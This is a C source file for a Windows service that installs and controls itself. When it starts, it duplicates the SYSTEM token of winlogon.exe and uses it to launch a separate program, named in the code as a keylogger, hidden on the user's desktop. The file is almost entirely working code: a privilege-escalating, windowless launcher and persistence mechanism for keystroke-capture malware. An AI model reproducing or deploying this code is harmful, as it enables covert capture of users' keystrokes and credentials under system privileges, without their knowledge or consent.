#include <windows.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>
#include "svc.h"

SERVICE_STATUS			gSvcStatus;
SERVICE_STATUS_HANDLE	gSvcStatusHandle;
HANDLE					ghSvcStopEvent = NULL;
PROCESS_INFORMATION		piKeylogger;

int _tmain(int argc, TCHAR* argv[])
{
	if (argc > 1)
	{
		if (_tcscmp(argv[1], TEXT("install")) == 0)
		{
			SvcInstall();
			return 0;
		}
		else if (_tcscmp(argv[1], TEXT("delete")) == 0)
		{
			SvcDelete();
			return 0;
		}
		else if (_tcscmp(argv[1], TEXT("start")) == 0)
		{
			SvcStart();
			return 0;
		}
		else if (_tcscmp(argv[1], TEXT("stop")) == 0)
		{
			SvcStop();
			return 0;
		}
	}

	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain },
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher(DispatchTable))
	{
		SvcReportEvent(TEXT("StartServiceCtrlDispatcher"));
	}
}

VOID SvcInstall()
{
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	TCHAR szPath[MAX_PATH];
	if (!GetModuleFileName(NULL, szPath, MAX_PATH))
	{
		printf("GetModuleFileName failed (%d)\n", GetLastError());
		return;
	}

	SC_HANDLE schService = CreateService(
		schSCManager, SVCNAME, SVCNAME,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		szPath, NULL, NULL, NULL, NULL, NULL);

	if (schService == NULL)
	{
		printf("CreateService failed (%d)\n", GetLastError());
	}
	else
	{
		printf("Service installed successfully\n");
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

VOID SvcDelete()
{
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, DELETE);
	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	if (!DeleteService(schService))
	{
		printf("DeleteService failed (%d)\n", GetLastError());
	}
	else
	{
		printf("Service deleted successfully\n");
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

VOID SvcStart()
{
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, SERVICE_START);
	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	if (!StartService(schService, 0, NULL))
	{
		printf("StartService failed (%d)\n", GetLastError());
	}
	else
	{
		printf("Service started successfully\n");
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

VOID SvcStop()
{
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, SERVICE_STOP);
	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	SERVICE_STATUS ssStatus;
	if (!ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
	{
		printf("ControlService failed (%d)\n", GetLastError());
	}
	else
	{
		printf("Service stopped successfully\n");
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

//
// Purpose: 
//   Entry point for the service
//
VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv) 
{
	// Register the handler function for the service
	gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);
	
	if (!gSvcStatusHandle)
	{
		SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
		return;
	}

	// These SERVICE_STATUS members remain as set here

	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	// Report initial status to the SCM

	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	// Perform service-specific initialization and work.

	SvcInit(dwArgc, lpszArgv);
}

DWORD GetProcessIdByName(const TCHAR* processName)
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD pid = 0;

	// Take a snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	// Initialize PROCESSENTRY32
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process, and exit if unsuccessful
	if (!Process32First(hSnapshot, &pe32))
	{
		CloseHandle(hSnapshot);
		return 0;
	}

	do
	{
		if (_tcscmp(pe32.szExeFile, processName) == 0)
		{
			pid = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);

	return pid; // Return the PID if found, otherwise 0
}

//
// Purpose: 
//   The service code
//
VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
{
	// Create an event. The control handler function, SvcCtrlHandler,
	// signals this event when it receives the stop control code.

	ghSvcStopEvent = CreateEvent(
		NULL,    // default security attributes
		TRUE,    // manual reset event
		FALSE,   // not signaled
		NULL);   // no name

	if (ghSvcStopEvent == NULL)
	{
		ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	// Report running status when initialization is complete.

	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

	// Obtain handle to SYSTEM token
	HANDLE hToken = NULL;
	HANDLE hDupToken = NULL;
	DWORD pid = GetProcessIdByName("winlogon.exe");
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	// Open the current process token
	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
	{
		ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	// Duplicate the token
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
	{
		CloseHandle(hToken);
		ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.lpDesktop = TEXT("winsta0\\default");

	TCHAR keyloggerPath[] = TEXT("C:\\Users\\User\\Desktop\\tinky-winkey\\winkey.exe");

	if (!CreateProcessAsUser(
		hDupToken,         // Token for the SYSTEM user
		NULL,              // Application name
		keyloggerPath,     // Command line
		NULL,              // Process handle not inheritable
		NULL,              // Thread handle not inheritable
		FALSE,             // Don't inherit handles
		CREATE_NO_WINDOW,  // No creation flags
		NULL,              // Use parent's environment block
		NULL,              // Use parent's current directory
		&si,               // Pointer to STARTUPINFO structure
		&piKeylogger))     // Pointer to PROCESS_INFORMATION structure
	{
		// Handle error if process creation failed
		ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
		CloseHandle(hToken);
		return;
	}

	CloseHandle(hToken);

	// Perform work until service stops.
	while (1)
	{
		// Check whether to stop the service.
		WaitForSingleObject(ghSvcStopEvent, INFINITE);
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

//
// Purpose: 
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
{
	// Handle the requested control code. 
	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP:
		ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

		// Signal the service to stop.

		SetEvent(ghSvcStopEvent);

		if (piKeylogger.hProcess != NULL)
		{
			TerminateProcess(piKeylogger.hProcess, 0);
			CloseHandle(piKeylogger.hProcess);
			CloseHandle(piKeylogger.hThread);
		}

		ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);

		return;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}
}

//
// Purpose: 
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation, 
//     in milliseconds
// 
// Return value:
//   None
//
VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure.

	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ((dwCurrentState == SERVICE_RUNNING) ||
		(dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else gSvcStatus.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM.
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

VOID SvcReportEvent(LPTSTR szFunction)
{
	// Placeholder for event logging
}